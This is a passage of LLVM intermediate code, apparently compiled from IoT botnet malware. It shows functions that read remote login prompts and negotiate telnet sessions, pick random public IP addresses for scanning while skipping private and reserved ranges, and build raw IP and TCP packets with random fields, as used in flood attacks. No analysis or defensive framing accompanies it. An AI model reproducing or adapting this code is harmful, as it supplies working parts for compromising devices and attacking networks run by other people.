  %25 = icmp sgt i64 %5, %indvars.iv.next.1
  br i1 %25, label %.lr.ph.1, label %.critedge.1.loopexit

.critedge.1.loopexit:                             ; preds = %.critedge1.1, %.lr.ph.1
  %.1.lcssa.1.ph = phi i32 [ %23, %.lr.ph.1 ], [ %24, %.critedge1.1 ]
  br label %.critedge.1

.critedge.1:                                      ; preds = %.critedge.1.loopexit, %.preheader.137
  %.1.lcssa.1 = phi i32 [ %.1.lcssa, %.preheader.137 ], [ %.1.lcssa.1.ph, %.critedge.1.loopexit ]
  %26 = sext i32 %.1.lcssa.1 to i64
  %27 = sub nsw i64 0, %26
  %28 = getelementptr inbounds i8, i8* %4, i64 %27
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 62
  br i1 %30, label %19, label %.preheader.238

.preheader.238:                                   ; preds = %.critedge.1
  %31 = icmp sgt i32 %2, %.1.lcssa.1
  br i1 %31, label %.lr.ph.2.preheader, label %.critedge.2

.lr.ph.2.preheader:                               ; preds = %.preheader.238
  br label %.lr.ph.2

.lr.ph.2:                                         ; preds = %.lr.ph.2.preheader, %.critedge1.2
  %indvars.iv.2 = phi i64 [ %indvars.iv.next.2, %.critedge1.2 ], [ %26, %.lr.ph.2.preheader ]
  %.130.2 = phi i32 [ %36, %.critedge1.2 ], [ %.1.lcssa.1, %.lr.ph.2.preheader ]
  %32 = sub nsw i64 0, %indvars.iv.2
  %33 = getelementptr inbounds i8, i8* %4, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = trunc i64 %indvars.iv.2 to i32
  switch i8 %34, label %.critedge.2.loopexit [
    i8 0, label %.critedge1.2
    i8 32, label %.critedge1.2
    i8 13, label %.critedge1.2
    i8 10, label %.critedge1.2
  ]

.critedge1.2:                                     ; preds = %.lr.ph.2, %.lr.ph.2, %.lr.ph.2, %.lr.ph.2
  %indvars.iv.next.2 = add nsw i64 %indvars.iv.2, 1
  %36 = add nsw i32 %.130.2, 1
  %37 = icmp sgt i64 %5, %indvars.iv.next.2
  br i1 %37, label %.lr.ph.2, label %.critedge.2.loopexit

.critedge.2.loopexit:                             ; preds = %.critedge1.2, %.lr.ph.2
  %.1.lcssa.2.ph = phi i32 [ %35, %.lr.ph.2 ], [ %36, %.critedge1.2 ]
  br label %.critedge.2

.critedge.2:                                      ; preds = %.critedge.2.loopexit, %.preheader.238
  %.1.lcssa.2 = phi i32 [ %.1.lcssa.1, %.preheader.238 ], [ %.1.lcssa.2.ph, %.critedge.2.loopexit ]
  %38 = sext i32 %.1.lcssa.2 to i64
  %39 = sub nsw i64 0, %38
  %40 = getelementptr inbounds i8, i8* %4, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = icmp eq i8 %41, 37
  br i1 %42, label %19, label %.preheader.339

.preheader.339:                                   ; preds = %.critedge.2
  %43 = icmp sgt i32 %2, %.1.lcssa.2
  br i1 %43, label %.lr.ph.3.preheader, label %.critedge.3

.lr.ph.3.preheader:                               ; preds = %.preheader.339
  br label %.lr.ph.3

.lr.ph.3:                                         ; preds = %.lr.ph.3.preheader, %.critedge1.3
  %indvars.iv.3 = phi i64 [ %indvars.iv.next.3, %.critedge1.3 ], [ %38, %.lr.ph.3.preheader ]
  %.130.3 = phi i32 [ %48, %.critedge1.3 ], [ %.1.lcssa.2, %.lr.ph.3.preheader ]
  %44 = sub nsw i64 0, %indvars.iv.3
  %45 = getelementptr inbounds i8, i8* %4, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = trunc i64 %indvars.iv.3 to i32
  switch i8 %46, label %.critedge.3.loopexit [
    i8 0, label %.critedge1.3
    i8 32, label %.critedge1.3
    i8 13, label %.critedge1.3
    i8 10, label %.critedge1.3
  ]

.critedge1.3:                                     ; preds = %.lr.ph.3, %.lr.ph.3, %.lr.ph.3, %.lr.ph.3
  %indvars.iv.next.3 = add nsw i64 %indvars.iv.3, 1
  %48 = add nsw i32 %.130.3, 1
  %49 = icmp sgt i64 %5, %indvars.iv.next.3
  br i1 %49, label %.lr.ph.3, label %.critedge.3.loopexit

.critedge.3.loopexit:                             ; preds = %.critedge1.3, %.lr.ph.3
  %.1.lcssa.3.ph = phi i32 [ %47, %.lr.ph.3 ], [ %48, %.critedge1.3 ]
  br label %.critedge.3

.critedge.3:                                      ; preds = %.critedge.3.loopexit, %.preheader.339
  %.1.lcssa.3 = phi i32 [ %.1.lcssa.2, %.preheader.339 ], [ %.1.lcssa.3.ph, %.critedge.3.loopexit ]
  %50 = sext i32 %.1.lcssa.3 to i64
  %51 = sub nsw i64 0, %50
  %52 = getelementptr inbounds i8, i8* %4, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = icmp eq i8 %53, 36
  br i1 %54, label %19, label %.preheader.440

.preheader.440:                                   ; preds = %.critedge.3
  %55 = icmp sgt i32 %2, %.1.lcssa.3
  br i1 %55, label %.lr.ph.4.preheader, label %.critedge.4

.lr.ph.4.preheader:                               ; preds = %.preheader.440
  br label %.lr.ph.4

.lr.ph.4:                                         ; preds = %.lr.ph.4.preheader, %.critedge1.4
  %indvars.iv.4 = phi i64 [ %indvars.iv.next.4, %.critedge1.4 ], [ %50, %.lr.ph.4.preheader ]
  %.130.4 = phi i32 [ %60, %.critedge1.4 ], [ %.1.lcssa.3, %.lr.ph.4.preheader ]
  %56 = sub nsw i64 0, %indvars.iv.4
  %57 = getelementptr inbounds i8, i8* %4, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = trunc i64 %indvars.iv.4 to i32
  switch i8 %58, label %.critedge.4.loopexit [
    i8 0, label %.critedge1.4
    i8 32, label %.critedge1.4
    i8 13, label %.critedge1.4
    i8 10, label %.critedge1.4
  ]

.critedge1.4:                                     ; preds = %.lr.ph.4, %.lr.ph.4, %.lr.ph.4, %.lr.ph.4
  %indvars.iv.next.4 = add nsw i64 %indvars.iv.4, 1
  %60 = add nsw i32 %.130.4, 1
  %61 = icmp sgt i64 %5, %indvars.iv.next.4
  br i1 %61, label %.lr.ph.4, label %.critedge.4.loopexit

.critedge.4.loopexit:                             ; preds = %.critedge1.4, %.lr.ph.4
  %.1.lcssa.4.ph = phi i32 [ %59, %.lr.ph.4 ], [ %60, %.critedge1.4 ]
  br label %.critedge.4

.critedge.4:                                      ; preds = %.critedge.4.loopexit, %.preheader.440
  %.1.lcssa.4 = phi i32 [ %.1.lcssa.3, %.preheader.440 ], [ %.1.lcssa.4.ph, %.critedge.4.loopexit ]
  %62 = sext i32 %.1.lcssa.4 to i64
  %63 = sub nsw i64 0, %62
  %64 = getelementptr inbounds i8, i8* %4, i64 %63
  %65 = load i8, i8* %64, align 1
  %66 = icmp eq i8 %65, 35
  %. = zext i1 %66 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8* nocapture readonly, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = sext i32 %3 to i64
  %12 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 0
  store i64 %11, i64* %12, align 8
  %13 = sext i32 %4 to i64
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 1
  store i64 %13, i64* %14, align 8
  %15 = add nsw i32 %7, 2
  %16 = icmp slt i32 %15, %6
  br i1 %16, label %.lr.ph, label %.critedge

.lr.ph:                                           ; preds = %8
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 0
  %18 = srem i32 %0, 64
  %19 = zext i32 %18 to i64
  %20 = shl i64 1, %19
  %21 = sdiv i32 %0, 64
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 %22
  %24 = add nsw i32 %0, 1
  %25 = icmp eq i32 %2, 0
  %26 = icmp sgt i32 %3, 0
  %27 = icmp sgt i32 %4, 0
  %28 = or i1 %26, %27
  br i1 %25, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br i1 %28, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.lr.ph.split.preheader
  br label %.lr.ph77

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br i1 %28, label %.lr.ph67.preheader, label %.critedge

.lr.ph67.preheader:                               ; preds = %.lr.ph.split.us.preheader
  br label %.lr.ph67

.lr.ph67:                                         ; preds = %.lr.ph67.preheader, %.backedge.us..lr.ph.split.us_crit_edge
  %.03335.us66 = phi i32 [ %40, %.backedge.us..lr.ph.split.us_crit_edge ], [ %7, %.lr.ph67.preheader ]
  %29 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %17) #3, !srcloc !16
  %30 = load i64, i64* %23, align 8
  %31 = or i64 %30, %20
  store i64 %31, i64* %23, align 8
  %32 = call i32 @select(i32 %24, %struct.__sigset_t* nonnull %9, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %10) #3
  %33 = icmp slt i32 %32, 1
  br i1 %33, label %.critedge.loopexit, label %34

; <label>:34:                                     ; preds = %.lr.ph67
  %35 = sext i32 %.03335.us66 to i64
  %36 = getelementptr inbounds i8, i8* %5, i64 %35
  %37 = call i64 @recv(i32 %0, i8* %36, i64 1, i32 0) #3
  %38 = trunc i64 %37 to i32
  switch i32 %38, label %39 [
    i32 -1, label %.critedge.loopexit
    i32 0, label %.critedge.loopexit
  ]

; <label>:39:                                     ; preds = %34
  %40 = add nsw i32 %38, %.03335.us66
  %41 = load i8, i8* %36, align 1
  %42 = icmp eq i8 %41, -1
  br i1 %42, label %.us-lcssa.us.loopexit, label %43

; <label>:43:                                     ; preds = %39
  %44 = call i8* @strstr(i8* nonnull %5, i8* %1) #15
  %45 = icmp eq i8* %44, null
  br i1 %45, label %.backedge.us, label %.critedge.loopexit

.backedge.us:                                     ; preds = %43
  %46 = add nsw i32 %40, 2
  %47 = icmp slt i32 %46, %6
  br i1 %47, label %.backedge.us..lr.ph.split.us_crit_edge, label %.critedge.loopexit

.backedge.us..lr.ph.split.us_crit_edge:           ; preds = %.backedge.us
  %.pre54 = load i64, i64* %12, align 8
  %.pre55 = load i64, i64* %14, align 8
  %48 = icmp sgt i64 %.pre54, 0
  %49 = icmp sgt i64 %.pre55, 0
  %50 = or i1 %48, %49
  br i1 %50, label %.lr.ph67, label %.critedge.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.backedge..lr.ph.split_crit_edge
  %.0333576 = phi i32 [ %62, %.backedge..lr.ph.split_crit_edge ], [ %7, %.lr.ph77.preheader ]
  %51 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %17) #3, !srcloc !16
  %52 = load i64, i64* %23, align 8
  %53 = or i64 %52, %20
  store i64 %53, i64* %23, align 8
  %54 = call i32 @select(i32 %24, %struct.__sigset_t* nonnull %9, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %10) #3
  %55 = icmp slt i32 %54, 1
  br i1 %55, label %.critedge.loopexit89, label %56

; <label>:56:                                     ; preds = %.lr.ph77
  %57 = sext i32 %.0333576 to i64
  %58 = getelementptr inbounds i8, i8* %5, i64 %57
  %59 = call i64 @recv(i32 %0, i8* %58, i64 1, i32 0) #3
  %60 = trunc i64 %59 to i32
  switch i32 %60, label %61 [
    i32 -1, label %.critedge.loopexit89
    i32 0, label %.critedge.loopexit89
  ]

; <label>:61:                                     ; preds = %56
  %62 = add nsw i32 %60, %.0333576
  %63 = load i8, i8* %58, align 1
  %64 = icmp eq i8 %63, -1
  br i1 %64, label %.us-lcssa.us.loopexit91, label %70

.us-lcssa.us.loopexit:                            ; preds = %39
  br label %.us-lcssa.us

.us-lcssa.us.loopexit91:                          ; preds = %61
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit91, %.us-lcssa.us.loopexit
  %.lcssa = phi i8* [ %36, %.us-lcssa.us.loopexit ], [ %58, %.us-lcssa.us.loopexit91 ]
  %65 = getelementptr inbounds i8, i8* %.lcssa, i64 1
  %66 = call i64 @recv(i32 %0, i8* %65, i64 2, i32 0) #3
  %67 = trunc i64 %66 to i32
  switch i32 %67, label %68 [
    i32 -1, label %.critedge
    i32 0, label %.critedge
  ]

; <label>:68:                                     ; preds = %.us-lcssa.us
  %69 = call i32 @negotiate(i32 %0, i8* nonnull %.lcssa, i32 undef)
  br label %.critedge

; <label>:70:                                     ; preds = %61
  %71 = call i8* @strstr(i8* nonnull %5, i8* %1) #15
  %72 = icmp eq i8* %71, null
  br i1 %72, label %78, label %.critedge.loopexit89

.backedge:                                        ; preds = %78
  %73 = add nsw i32 %62, 2
  %74 = icmp slt i32 %73, %6
  br i1 %74, label %.backedge..lr.ph.split_crit_edge, label %.critedge.loopexit89

.backedge..lr.ph.split_crit_edge:                 ; preds = %.backedge
  %.pre = load i64, i64* %12, align 8
  %.pre53 = load i64, i64* %14, align 8
  %75 = icmp sgt i64 %.pre, 0
  %76 = icmp sgt i64 %.pre53, 0
  %77 = or i1 %75, %76
  br i1 %77, label %.lr.ph77, label %.critedge.loopexit89

; <label>:78:                                     ; preds = %70
  %79 = call i32 @matchPrompt(i8* nonnull %5)
  %80 = icmp eq i32 %79, 0
  br i1 %80, label %.backedge, label %.critedge.loopexit89

.critedge.loopexit:                               ; preds = %34, %34, %43, %.lr.ph67, %.backedge.us..lr.ph.split.us_crit_edge, %.backedge.us
  %.0.ph = phi i32 [ 0, %34 ], [ 0, %34 ], [ 1, %43 ], [ 0, %.lr.ph67 ], [ 0, %.backedge.us..lr.ph.split.us_crit_edge ], [ 0, %.backedge.us ]
  br label %.critedge

.critedge.loopexit89:                             ; preds = %56, %56, %70, %78, %.lr.ph77, %.backedge..lr.ph.split_crit_edge, %.backedge
  %.0.ph90 = phi i32 [ 0, %56 ], [ 0, %56 ], [ 1, %70 ], [ 1, %78 ], [ 0, %.lr.ph77 ], [ 0, %.backedge..lr.ph.split_crit_edge ], [ 0, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit89, %.critedge.loopexit, %.lr.ph.split.preheader, %.lr.ph.split.us.preheader, %8, %.us-lcssa.us, %.us-lcssa.us, %68
  %.0 = phi i32 [ 0, %68 ], [ 0, %.us-lcssa.us ], [ 0, %.us-lcssa.us ], [ 0, %8 ], [ 0, %.lr.ph.split.us.preheader ], [ 0, %.lr.ph.split.preheader ], [ %.0.ph, %.critedge.loopexit ], [ %.0.ph90, %.critedge.loopexit89 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomPublicIP() local_unnamed_addr #1 {
  %1 = alloca [16 x i8], align 16
  br label %.critedge

.critedge:                                        ; preds = %.critedge.backedge, %0
  %2 = tail call i32 @rand() #3
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* @GetRandomPublicIP.ipState.0, align 1
  %5 = tail call i32 @rand() #3
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* @GetRandomPublicIP.ipState.1, align 1
  %8 = tail call i32 @rand() #3
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* @GetRandomPublicIP.ipState.2, align 1
  %11 = tail call i32 @rand() #3
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* @GetRandomPublicIP.ipState.3, align 1
  %14 = load i8, i8* @GetRandomPublicIP.ipState.0, align 1
  switch i8 %14, label %18 [
    i8 127, label %.critedge.backedge
    i8 0, label %.critedge.backedge
    i8 3, label %.critedge.backedge
    i8 15, label %.critedge.backedge
    i8 16, label %.critedge.backedge
    i8 56, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 -64, label %15
  ]

.critedge.backedge:                               ; preds = %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %15, %19, %23, %26, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %29
  br label %.critedge

; <label>:15:                                     ; preds = %.critedge
  %16 = load i8, i8* @GetRandomPublicIP.ipState.1, align 1
  %17 = icmp eq i8 %16, -88
  br i1 %17, label %.critedge.backedge, label %.thread37

; <label>:18:                                     ; preds = %.critedge
  switch i8 %14, label %26 [
    i8 -84, label %19
    i8 100, label %23
  ]

; <label>:19:                                     ; preds = %18
  %20 = load i8, i8* @GetRandomPublicIP.ipState.1, align 1
  %21 = and i8 %20, -16
  %22 = icmp eq i8 %21, 16
  br i1 %22, label %.critedge.backedge, label %.thread37

.thread37:                                        ; preds = %15, %19
  %.pre38 = load i8, i8* @GetRandomPublicIP.ipState.1, align 1
  br label %.thread40

; <label>:23:                                     ; preds = %18
  %24 = load i8, i8* @GetRandomPublicIP.ipState.1, align 1
  %.off = add i8 %24, -64
  %25 = icmp ult i8 %.off, 63
  br i1 %25, label %.critedge.backedge, label %.thread40.thread

; <label>:26:                                     ; preds = %18
  %.pre = load i8, i8* @GetRandomPublicIP.ipState.1, align 1
  %27 = icmp eq i8 %14, -87
  %28 = icmp eq i8 %.pre, -1
  %or.cond31 = and i1 %27, %28
  br i1 %or.cond31, label %.critedge.backedge, label %29

; <label>:29:                                     ; preds = %26
  %30 = icmp eq i8 %14, -58
  %31 = and i8 %.pre, -2
  %32 = icmp eq i8 %31, 18
  %or.cond = and i1 %30, %32
  br i1 %or.cond, label %.critedge.backedge, label %.thread40

.thread40:                                        ; preds = %.thread37, %29
  %33 = phi i8 [ %.pre, %29 ], [ %.pre38, %.thread37 ]
  switch i8 %14, label %.thread40.thread [
    i8 -32, label %.critedge.backedge
    i8 6, label %.critedge.backedge
    i8 7, label %.critedge.backedge
    i8 11, label %.critedge.backedge
    i8 21, label %.critedge.backedge
    i8 22, label %.critedge.backedge
    i8 26, label %.critedge.backedge
    i8 28, label %.critedge.backedge
    i8 29, label %.critedge.backedge
    i8 30, label %.critedge.backedge
    i8 33, label %.critedge.backedge
    i8 55, label %.critedge.backedge
    i8 -42, label %.critedge.backedge
    i8 -41, label %.critedge.backedge
  ]

.thread40.thread:                                 ; preds = %23, %.thread40
  %34 = phi i8 [ %33, %.thread40 ], [ %24, %23 ]
  %35 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %35, i8 0, i64 16, i32 16, i1 false)
  %36 = zext i8 %14 to i32
  %37 = zext i8 %34 to i32
  %38 = load i8, i8* @GetRandomPublicIP.ipState.2, align 1
  %39 = zext i8 %38 to i32
  %40 = and i32 %12, 255
  %41 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %35, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.136, i64 0, i64 0), i32 %36, i32 %37, i32 %39, i32 %40)
  %42 = call i32 @inet_addr(i8* nonnull %35) #3
  ret i32 %42
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #18
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv33 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv33, 4
  br i1 %min.iters.check, label %.lr.ph16.preheader34, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph16.preheader
  %8 = zext i32 %addconv33 to i64
  %9 = and i32 %addconv33, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end27 = getelementptr i16, i16* %0, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph16.preheader34, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi28 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load31 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load31 to <2 x i64>
  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi28
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !17

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx32 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx32, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge17.loopexit, label %.lr.ph16.preheader34

.lr.ph16.preheader34:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph16.preheader
  %.014.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph16.preheader ], [ %19, %middle.block ]
  %.0913.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph16.preheader ], [ %ind.end, %middle.block ]
  %.01012.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph16.preheader ], [ %ind.end27, %middle.block ]
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16.preheader34, %.lr.ph16
  %.014 = phi i64 [ %23, %.lr.ph16 ], [ %.014.ph, %.lr.ph16.preheader34 ]
  %.0913 = phi i32 [ %24, %.lr.ph16 ], [ %.0913.ph, %.lr.ph16.preheader34 ]
  %.01012 = phi i16* [ %20, %.lr.ph16 ], [ %.01012.ph, %.lr.ph16.preheader34 ]
  %20 = getelementptr inbounds i16, i16* %.01012, i64 1
  %21 = load i16, i16* %.01012, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.014
  %24 = add nsw i32 %.0913, -2
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %.lr.ph16, label %._crit_edge17.loopexit.loopexit, !llvm.loop !18

._crit_edge17.loopexit.loopexit:                  ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %._crit_edge17.loopexit.loopexit, %middle.block
  %.lcssa25 = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge17.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa25, %._crit_edge17.loopexit ]
  %27 = icmp eq i32 %.09.lcssa, 1
  br i1 %27, label %28, label %.preheader

; <label>:28:                                     ; preds = %._crit_edge17
  %29 = bitcast i16* %.010.lcssa to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = add i64 %31, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %28, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %32, %28 ]
  %33 = lshr i64 %.1.ph, 16
  %34 = icmp eq i64 %33, 0
  br i1 %34, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %35 = phi i64 [ %38, %.lr.ph ], [ %33, %.lr.ph.preheader ]
  %.111 = phi i64 [ %37, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %36 = and i64 %.111, 65535
  %37 = add nuw nsw i64 %36, %35
  %38 = lshr i64 %37, 16
  %39 = icmp eq i64 %38, 0
  br i1 %39, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %37, %._crit_edge.loopexit ]
  %40 = trunc i64 %.1.lcssa to i16
  %41 = xor i16 %40, -1
  ret i16 %41
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = bitcast i32* %3 to <2 x i32>*
  %5 = load <2 x i32>, <2 x i32>* %4, align 4
  %6 = zext <2 x i32> %5 to <2 x i64>
  %7 = tail call zeroext i16 @htons(i16 zeroext 20) #18
  %8 = tail call noalias i8* @malloc(i64 44) #3
  %9 = bitcast i8* %8 to i16*
  %10 = bitcast i8* %8 to <2 x i64>*
  store <2 x i64> %6, <2 x i64>* %10, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %8, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %8, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %8, i64 18
  %11 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %7, i16* %11, align 1
  %12 = getelementptr inbounds i8, i8* %8, i64 24
  %13 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %12, i8* %13, i64 20, i32 1, i1 false)
  %14 = tail call zeroext i16 @csum(i16* %9, i32 44)
  tail call void @free(i8* %8) #3
  ret i16 %14
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #1 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #3
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
